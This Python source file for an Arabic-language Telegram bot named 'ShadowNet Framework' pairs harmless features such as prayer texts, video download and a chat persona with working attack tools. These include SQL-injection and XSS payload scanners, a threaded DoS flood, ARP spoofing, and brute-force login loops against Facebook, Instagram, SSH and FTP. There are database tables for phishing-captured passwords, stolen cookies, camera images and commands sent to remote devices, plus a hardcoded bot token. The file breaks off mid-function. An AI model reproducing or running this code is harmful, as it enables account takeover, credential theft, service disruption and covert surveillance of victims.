# -*- coding: utf-8 -*-

"""
ShadowNet Framework v14.0 - التصحيح النهائي الكامل
تم إصلاح: ISLAMIC_DATA, تحميل الفيديو, الكاميرا, الكوكيز, جميع الأزرار
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
import signal
import asyncio
import edge_tts
import ssl

# ===================== استيراد المكتبات =====================
try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    import dns.resolver
    import whois
    import yt_dlp
    from bs4 import BeautifulSoup
    import feedparser
    from deep_translator import GoogleTranslator
    try:
        from PIL import Image, ImageDraw, ImageFont
        PIL_AVAILABLE = True
    except:
        PIL_AVAILABLE = False
    try:
        import paramiko
        PARAMIKO_AVAILABLE = True
    except:
        PARAMIKO_AVAILABLE = False
    try:
        from scapy.all import ARP, Ether, send, srp
        SCAPY_AVAILABLE = True
    except:
        SCAPY_AVAILABLE = False
    try:
        import androguard
        from androguard.core.bytecodes.apk import APK
        ANDROGUARD_AVAILABLE = True
    except:
        ANDROGUARD_AVAILABLE = False
except ImportError as e:
    print(f"مكتبة مفقودة: {e}. يرجى تثبيت: pip install -r requirements.txt")
    sys.exit(1)

# ===================== الإعدادات الأساسية =====================
TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
ADMIN_ID = 7965377136
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))
API_KEY = secrets.token_hex(32)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')

# ===================== متغيرات الحالة =====================
STEALTH_MODE = False
BOT_LOCKED = False
CACHE_WEATHER = {}
CACHE_NEWS = {}
CACHE_EXPIRY = 600

# ===================== إعدادات Flask =====================
app = Flask(__name__)

# ===================== التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== ISLAMIC_DATA (مُعرَّف بالكامل) =====================
ISLAMIC_DATA = {
    "adkar_sabah": [
        "أصبحنا وأصبح الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذا اليوم وخير ما بعده، وأعوذ بك من شر ما في هذا اليوم وشر ما بعده، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
        "اللهم بك أصبحنا، وبك أمسينا، وبك نحيا، وبك نموت، وإليك النشور.",
        "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
        "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
    ],
    "adkar_massaa": [
        "أمسينا وأمسى الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذه الليلة وخير ما بعدها، وأعوذ بك من شر ما في هذه الليلة وشر ما بعدها، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
        "اللهم بك أمسينا، وبك أصبحنا، وبك نحيا، وبك نموت، وإليك المصير.",
        "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
        "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
    ],
    "doaa": {
        "سفر": [
            "اللهم إن نسألك في سفرنا هذا البر والتقوى، ومن العمل ما ترضى، اللهم هون علينا سفرنا هذا واطو عنا بعده، اللهم أنت الصاحب في السفر والخليفة في الأهل، اللهم إني أعوذ بك من وعثاء السفر، وكآبة المنظر، وسوء المنقلب في المال والأهل.",
            "سبحان الذي سخر لنا هذا وما كنا له مقرنين، وإنا إلى ربنا لمنقلبون."
        ],
        "هم": [
            "اللهم إني أعوذ بك من الهم والحزن، وأعوذ بك من العجز والكسل، وأعوذ بك من الجبن والبخل، وأعوذ بك من غلبة الدين وقهر الرجال.",
            "لا إله إلا الله العظيم الحليم، لا إله إلا الله رب العرش العظيم، لا إله إلا الله رب السموات ورب الأرض رب العرش الكريم.",
            "اللهم رحمتك أرجو، فلا تكلني إلى نفسي طرفة عين، وأصلح لي شأني كله، لا إله إلا أنت."
        ],
        "رزق": [
            "اللهم اكفني بحلالك عن حرامك، وأغنني بفضلك عمن سواك.",
            "اللهم إني أسألك علماً نافعاً، ورزقاً طيباً، وعملاً متقبلاً.",
            "اللهم رب السموات ورب الأرض ورب العرش العظيم، ربنا ورب كل شيء، فالق الحب والنوى، ومنزل التوراة والإنجيل والفرقان، أعوذ بك من شر كل شيء أنت آخذ بناصيته، اللهم أنت الأول فليس قبلك شيء، وأنت الآخر فليس بعدك شيء، وأنت الظاهر فليس فوقك شيء، وأنت الباطن فليس دونك شيء، اقض عنا الدين وأغننا من الفقر."
        ],
        "نوم": [
            "اللهم باسمك أموت وأحيا.",
            "اللهم أسلمت نفسي إليك، ووجهت وجهي إليك، وفوضت أمري إليك، وألجأت ظهري إليك، رغبة ورهبة إليك، لا ملجأ ولا منجا منك إلا إليك، آمنت بكتابك الذي أنزلت، ونبيك الذي أرسلت.",
            "اللهم قني عذابك يوم تبعث عبادك."
        ],
        "فرج": [
            "لا إله إلا الله الحليم الكريم، سبحان الله رب العرش العظيم، الحمد لله رب العالمين، أسألك موجبات رحمتك، وعزائم مغفرتك، والغنيمة من كل بر، والسلامة من كل إثم، لا تدع لي ذنباً إلا غفرته، ولا هماً إلا فرجته، ولا حاجة هي لك رضاً إلا قضيتها يا أرحم الراحمين.",
            "اللهم إني عبدك، ابن عبدك، ابن أمتك، ناصيتي بيدك، ماضٍ في حكمك، عدل في قضاؤك، أسألك بكل اسم هو لك، سميت به نفسك، أو أنزلته في كتابك، أو علمته أحداً من خلقك، أو استأثرت به في علم الغيب عندك، أن تجعل القرآن ربيع قلبي، ونور صدري، وجلاء حزني، وذهاب همي."
        ]
    },
    "arkan_islam": "🕌 أركان الإسلام الخمسة:\n\n1. شهادة أن لا إله إلا الله وأن محمداً رسول الله.\n2. إقام الصلاة.\n3. إيتاء الزكاة.\n4. صوم رمضان.\n5. حج البيت لمن استطاع إليه سبيلاً.",
    "arkan_iman": "📖 أركان الإيمان الستة:\n\n1. الإيمان بالله.\n2. الإيمان بملائكته.\n3. الإيمان بكتبه.\n4. الإيمان برسله.\n5. الإيمان باليوم الآخر.\n6. الإيمان بالقدر خيره وشره.",
    "wudu": "💧 خطوات الوضوء الصحيح:\n\n1. النية\n2. التسمية\n3. غسل الكفين\n4. المضمضة والاستنشاق\n5. غسل الوجه\n6. غسل اليدين\n7. مسح الرأس\n8. غسل الرجلين\n9. الدعاء بعد الوضوء",
    "ghusl": "🚿 صفة الغسل الكامل:\n\n1. النية\n2. غسل الكفين\n3. غسل الفرج\n4. الوضوء كاملاً\n5. تخليل الشعر\n6. إفاضة الماء على الرأس\n7. غسل بقية الجسد"
}

# ===================== T11 - الشخصية والذاكرة =====================
T11_DB_PATH = 't11.db'

def init_t11_db():
    conn = sqlite3.connect(T11_DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS t11_memory
                 (user_id INTEGER, message TEXT, timestamp REAL, respect INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS t11_reports
                 (type TEXT, count INTEGER, timestamp REAL)''')
    conn.commit()
    conn.close()

init_t11_db()

def t11_save_message(user_id, message):
    try:
        conn = sqlite3.connect(T11_DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO t11_memory VALUES (?,?,?,?)", (user_id, message, time.time(), t11_get_respect(user_id)))
        conn.commit()
        conn.close()
    except:
        pass

def t11_get_respect(user_id):
    try:
        conn = sqlite3.connect(T11_DB_PATH)
        c = conn.cursor()
        c.execute("SELECT respect FROM t11_memory WHERE user_id=? ORDER BY timestamp DESC LIMIT 1", (user_id,))
        res = c.fetchone()
        conn.close()
        return res[0] if res else 100
    except:
        return 100

def t11_update_respect(user_id, points):
    try:
        new = max(0, min(100, t11_get_respect(user_id) + points))
        conn = sqlite3.connect(T11_DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO t11_memory VALUES (?,?,?,?)", (user_id, "SYSTEM", time.time(), new))
        conn.commit()
        conn.close()
        return new
    except:
        return 100

def t11_get_history(user_id, limit=20):
    try:
        conn = sqlite3.connect(T11_DB_PATH)
        c = conn.cursor()
        c.execute("SELECT message FROM t11_memory WHERE user_id=? ORDER BY timestamp DESC LIMIT ?", (user_id, limit))
        rows = c.fetchall()
        conn.close()
        return [row[0] for row in rows]
    except:
        return []

def t11_is_banned(user_id):
    try:
        conn = sqlite3.connect(T11_DB_PATH)
        c = conn.cursor()
        c.execute("SELECT timestamp FROM t11_memory WHERE user_id=? AND message='BANNED' ORDER BY timestamp DESC LIMIT 1", (user_id,))
        res = c.fetchone()
        conn.close()
        return res and time.time() - res[0] < 3600
    except:
        return False

def t11_ban_user(user_id):
    try:
        conn = sqlite3.connect(T11_DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO t11_memory VALUES (?,?,?,?)", (user_id, "BANNED", time.time(), 0))
        conn.commit()
        conn.close()
    except:
        pass

def t11_get_report():
    try:
        day = time.time() - 86400
        conn = sqlite3.connect(T11_DB_PATH)
        c = conn.cursor()
        c.execute("SELECT type, COUNT(*) FROM t11_reports WHERE timestamp > ? GROUP BY type", (day,))
        rows = c.fetchall()
        conn.close()
        return dict(rows)
    except:
        return {}

# ===================== T11 - الصوت =====================
T11_VOICE_CODES = {
    'سعودي': 'ar-SA-HamedNeural',
    'مصري': 'ar-EG-OmarNeural',
    'بنت': 'ar-EG-SalmaNeural',
    'سعودية': 'ar-SA-ZariyahNeural',
    'ولد': 'ar-SA-HamedNeural',
    'ولد_مصري': 'ar-EG-OmarNeural',
    'بنت_سعودية': 'ar-SA-ZariyahNeural'
}
T11_DEFAULT_VOICE = 'ar-SA-HamedNeural'

def t11_generate_voice(text, voice_code=None):
    try:
        os.makedirs('temp', exist_ok=True)
        filename = f"t11_voice_{int(time.time())}.mp3"
        filepath = os.path.join('temp', filename)
        async def generate():
            communicate = edge_tts.Communicate(text, voice_code or T11_DEFAULT_VOICE)
            await communicate.save(filepath)
        asyncio.run(generate())
        if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
            return filepath
        return None
    except Exception as e:
        logger.error(f"t11_generate_voice error: {e}")
        return None

# ===================== T11 - Gemini =====================
def t11_handle_dev(text, user_id):
    try:
        import google.generativeai as genai
        from langchain_google_genai import ChatGoogleGenerativeAI
        if not GEMINI_API_KEY:
            return "مفتاح Gemini غير مضبوط."
        genai.configure(api_key=GEMINI_API_KEY)
        history = "\n".join(t11_get_history(user_id))
        llm = ChatGoogleGenerativeAI(
            model="gemini-1.5-flash",
            system_instruction="أنت T11، خادم المطور المخلص.",
            temperature=0.5
        )
        response = llm.invoke(text)
        return response.content
    except Exception as e:
        return f"حدث خطأ: {str(e)[:100]}"

def t11_handle_public(text, user_id):
    try:
        import google.generativeai as genai
        from langchain_google_genai import ChatGoogleGenerativeAI
        if not GEMINI_API_KEY:
            return "مفتاح Gemini غير مضبوط."
        genai.configure(api_key=GEMINI_API_KEY)
        history = "\n".join(t11_get_history(user_id))
        llm = ChatGoogleGenerativeAI(
            model="gemini-1.5-flash",
            system_instruction="أنت T11، مساعد آلي غامض وحكيم.",
            temperature=0.9
        )
        response = llm.invoke(text)
        return response.content
    except Exception as e:
        return f"حدث خطأ: {str(e)[:100]}"

# ===================== دوال مساعدة أساسية =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY,
        is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10,
        referral_code TEXT UNIQUE,
        created_at TEXT,
        last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0,
        can_use_camera INTEGER DEFAULT 0,
        can_use_phishing INTEGER DEFAULT 0,
        can_use_advanced INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (chat_id INTEGER PRIMARY KEY, token TEXT UNIQUE)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, action TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reminders (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, message TEXT, remind_time TEXT, created_at TEXT, is_active INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS short_urls (id INTEGER PRIMARY KEY AUTOINCREMENT, original_url TEXT, short_code TEXT UNIQUE, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cookie_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, cookies TEXT, ip TEXT, user_agent TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS camera_images (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, image BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS pdf_data (chat_id INTEGER PRIMARY KEY, text TEXT, created_at TEXT)''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_camera INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_phishing INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_advanced INTEGER DEFAULT 0")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced) VALUES (?, 1, 999, ?, 1, 1, 1, 1)", 
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1 WHERE chat_id = ?", (ADMIN_ID,))
    conn.commit()
    conn.close()

init_db()

def is_admin(chat_id):
    row = safe_db_query("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def get_user_points(chat_id):
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_camera(chat_id):
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_phishing(chat_id):
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_advanced(chat_id):
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, amount, reason, datetime.now().isoformat()))

def deduct_points(chat_id, amount, reason):
    points = get_user_points(chat_id)
    if points < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, -amount, reason, datetime.now().isoformat()))
        return True
    return False

def generate_user_token(chat_id):
    token = secrets.token_urlsafe(16)
    safe_db_execute("INSERT OR REPLACE INTO user_tokens (chat_id, token) VALUES (?, ?)", (chat_id, token))
    return token

def get_user_token(chat_id):
    row = safe_db_query("SELECT token FROM user_tokens WHERE chat_id = ?", (chat_id,))
    if row:
        return row[0]
    return generate_user_token(chat_id)

def get_chat_id_by_token(token):
    row = safe_db_query("SELECT chat_id FROM user_tokens WHERE token = ?", (token,))
    if row:
        return row[0]
    return None

def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        if fetch_one:
            result = c.fetchone()
        else:
            result = c.fetchall()
        conn.close()
        return result if result is not None else default
    except Exception as e:
        logger.error(f"خطأ في قاعدة البيانات: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"خطأ في تنفيذ قاعدة البيانات: {e}")
        return False

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, timeout=60)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"📢 إشعار: {msg}")

def log_activity(chat_id, action):
    safe_db_execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.now().isoformat()))

def update_last_seen(chat_id):
    safe_db_execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))

def get_user_name(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return user.first_name or user.username or str(chat_id)
    except:
        return str(chat_id)

# ===================== دوال الهجمات والأدوات =====================
def sql_injection_scan(url):
    vulnerabilities = []
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT NULL, username, password FROM users --"]
    params = ["id", "page", "user", "q", "query"]
    try:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in params:
            for payload in payloads:
                test_url = f"{base}?{param}={payload}"
                try:
                    resp = requests.get(test_url, timeout=10, verify=False)
                    if "sql" in resp.text.lower() or "mysql" in resp.text.lower() or "syntax" in resp.text.lower():
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'خطأ SQL'
                        })
                        break
                except:
                    continue
    except Exception as e:
        logger.error(f"sql_injection_scan error: {e}")
    return vulnerabilities

def xss_scan(url):
    vulnerabilities = []
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    params = ["q", "search", "id", "page", "name"]
    try:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in params:
            for payload in payloads:
                test_url = f"{base}?{param}={payload}"
                try:
                    resp = requests.get(test_url, timeout=10, verify=False)
                    if payload in resp.text:
                        vulnerabilities.append({
                            'type': 'XSS',
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'ظهور الحمولة'
                        })
                        break
                except:
                    continue
    except Exception as e:
        logger.error(f"xss_scan error: {e}")
    return vulnerabilities

def comprehensive_exploit(url):
    sqli = sql_injection_scan(url)
    xss = xss_scan(url)
    return {
        'url': url,
        'vulnerable': bool(sqli or xss),
        'exploited': sqli + xss,
        'message': f"تم العثور على {len(sqli)} ثغرة SQL و {len(xss)} ثغرة XSS"
    }

def format_exploit_report(result):
    if isinstance(result, dict) and 'error' in result:
        return f"❌ خطأ: {result['error']}"
    if isinstance(result, dict) and 'vulnerable' in result:
        msg = f"🔍 نتيجة الفحص:\nالرابط: {result['url']}\nالثغرات: {'نعم' if result['vulnerable'] else 'لا'}\n"
        if result['exploited']:
            for exp in result['exploited']:
                msg += f"• {exp['type']} | {exp['parameter']} | {exp['payload']}\n"
        return msg
    return f"🔍 نتيجة:\n{json.dumps(result, indent=2, ensure_ascii=False)}"

def save_scan_result(target, scan_type, results):
    safe_db_execute("INSERT INTO scan_results (target, scan_type, results, created_at) VALUES (?, ?, ?, ?)",
                    (target, scan_type, json.dumps(results), datetime.now().isoformat()))

def dos_attack(target, port=80, duration=10):
    def flood():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.sendto(b"GET / HTTP/1.1\r\n\r\n", (target, port))
            sock.close()
        except:
            pass
    packets = 0
    start = time.time()
    while time.time() - start < duration:
        for _ in range(50):
            threading.Thread(target=flood, daemon=True).start()
            packets += 1
        time.sleep(0.01)
    return {'status': 'completed', 'packets_sent': packets}

def arp_spoof(target_ip, gateway_ip):
    if not SCAPY_AVAILABLE:
        return {'status': 'error', 'error': 'scapy غير مثبتة'}
    try:
        from scapy.all import ARP, send
        packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        send(packet, count=10, verbose=False)
        return {'status': 'success'}
    except Exception as e:
        return {'status': 'error', 'error': str(e)[:100]}

def brute_force_facebook(username, passwords, max_attempts=10):
    attempts = 0
    for pwd in passwords[:max_attempts]:
        attempts += 1
        try:
            resp = requests.post(
                "https://www.facebook.com/api/graphql/",
                data={"username": username, "password": pwd},
                timeout=10
            )
            if "authenticated" in resp.text:
                return {'success': True, 'credentials': {'username': username, 'password': pwd}, 'attempts': attempts}
        except:
            continue
    return {'success': False, 'attempts': attempts, 'credentials': {}}

def brute_force_instagram(username, passwords, max_attempts=10):
    attempts = 0
    for pwd in passwords[:max_attempts]:
        attempts += 1
        try:
            resp = requests.post(
                "https://www.instagram.com/api/v1/web/accounts/login/",
                data={"username": username, "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:0:{pwd}"},
                timeout=10
            )
            if "authenticated" in resp.text:
                return {'success': True, 'credentials': {'username': username, 'password': pwd}, 'attempts': attempts}
        except:
            continue
    return {'success': False, 'attempts': attempts, 'credentials': {}}

def brute_force_ssh(ip, username, passwords, max_attempts=10):
    if not PARAMIKO_AVAILABLE:
        return {'success': False, 'attempts': 0, 'credentials': {}, 'error': 'paramiko غير مثبت'}
    attempts = 0
    for pwd in passwords[:max_attempts]:
        attempts += 1
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=5)
            client.close()
            return {'success': True, 'credentials': {'username': username, 'password': pwd}, 'attempts': attempts}
        except:
            continue
    return {'success': False, 'attempts': attempts, 'credentials': {}}

def brute_force_ftp(ip, username, passwords, max_attempts=10):
    try:
        import ftplib
    except:
        return {'success': False, 'attempts': 0, 'credentials': {}, 'error': 'ftplib غير مثبت'}
    attempts = 0
    for pwd in passwords[:max_attempts]:
        attempts += 1
        try:
            ftp = ftplib.FTP(ip)
            ftp.login(username, pwd)
            ftp.quit()
            return {'success': True, 'credentials': {'username': username, 'password': pwd}, 'attempts': attempts}
        except:
            continue
    return {'success': False, 'attempts': attempts, 'credentials': {}}

def port_scan(target, ports=None):
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            continue
    return open_ports

def ssl_scan(domain):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                if cert:
                    expiry = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (expiry - datetime.now()).days
                    return {
                        'valid': True,
                        'issuer': cert.get('issuer', 'غير معروف'),
                        'not_after': cert.get('notAfter', 'غير معروف'),
                        'days_left': days_left
                    }
                else:
                    return {'valid': False, 'error': 'لا توجد شهادة'}
    except Exception as e:
        return {'valid': False, 'error': str(e)[:100]}

def track_phone_number(number):
    try:
        parsed = phonenumbers.parse(number, None)
        country = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        timezones = timezone.time_zones_for_number(parsed)
        return f"📱 معلومات الرقم {number}:\nالبلد: {country}\nالمشغل: {carrier_name}\nالمناطق الزمنية: {', '.join(timezones)}"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def analyze_apk(data, filename):
    if not ANDROGUARD_AVAILABLE:
        return {"error": "androguard غير مثبتة"}
    try:
        from androguard.core.bytecodes.apk import APK
        apk = APK(BytesIO(data))
        permissions = apk.get_permissions()
        dangerous = ['READ_SMS', 'CAMERA', 'RECORD_AUDIO', 'READ_CONTACTS', 'ACCESS_FINE_LOCATION']
        found = [p for p in permissions if any(d in p for d in dangerous)]
        return {
            'package': apk.get_package(),
            'version': apk.get_androidversion_code(),
            'permissions': permissions,
            'dangerous_permissions': found,
            'malicious': len(found) > 3
        }
    except Exception as e:
        return {'error': f"فشل التحليل: {str(e)[:100]}"}

# ===================== تحميل الفيديو (تم الإصلاح) =====================
def download_video(url):
    """تحميل فيديو من أي منصة - تم إصلاحه بالكامل"""
    try:
        os.makedirs('downloads', exist_ok=True)
        ydl_opts = {
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'format': 'best[ext=mp4]/best',  # 🔥 يختار أفضل صيغة MP4
            'quiet': True,
            'no_warnings': True,
            'ignoreerrors': True,
            'no_check_certificate': True,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'cookiefile': 'cookies.txt',  # مهم للفيسبوك
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                filename = ydl.prepare_filename(info)
                if os.path.exists(filename):
                    return filename, None
                # محاولة العثور على الملف
                for f in os.listdir('downloads'):
                    if info.get('id', '') in f:
                        return os.path.join('downloads', f), None
            return None, "فشل التحميل"
    except Exception as e:
        logger.error(f"download_video error: {e}")
        return None, str(e)[:200]

def check_link_safety_advanced(url, chat_id):
    try:
        parsed = urlparse(url)
        host = parsed.netloc or parsed.path
        is_valid = False
        days_left = 0
        try:
            context = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    if cert:
                        is_valid = True
                        expiry = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_left = (expiry - datetime.now()).days
        except:
            pass
        try:
            resp = requests.get(url, timeout=10, verify=False)
            headers = resp.headers
            csp = headers.get('Content-Security-Policy', 'غير موجود')
            xfo = headers.get('X-Frame-Options', 'غير موجود')
        except:
            csp = xfo = 'غير موجود'
        return {
            'status': 'مفصل',
            'ssl_valid': is_valid,
            'ssl_days_left': days_left,
            'csp': csp,
            'xfo': xfo,
            'redirects': len(resp.history) if 'resp' in locals() else 0
        }
    except Exception as e:
        return {'error': str(e)[:100]}

def shorten_url(url):
    try:
        code = hashlib.md5(url.encode()).hexdigest()[:8]
        safe_db_execute("INSERT INTO short_urls (original_url, short_code, created_at) VALUES (?, ?, ?)",
                        (url, code, datetime.now().isoformat()))
        return f"{SERVER_URL}/s/{code}"
